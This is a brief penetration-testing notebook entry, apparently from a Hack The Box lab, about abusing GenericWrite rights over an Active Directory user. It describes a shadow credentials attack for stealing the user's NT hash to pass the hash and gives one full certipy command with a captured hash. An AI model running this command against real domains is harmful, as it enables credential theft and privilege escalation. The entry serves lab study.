[GenericWrite](_Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Active%20Directory%20Methdology/Bloodhound/GenericWrite_GenericAll.md) over a user object allows you to use pywhisker or preferable certipy shadow auto to perform shadow credential attack to steal their NT hash you can use for pass the hash (pth)

certipy-ad shadow auto -u management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator


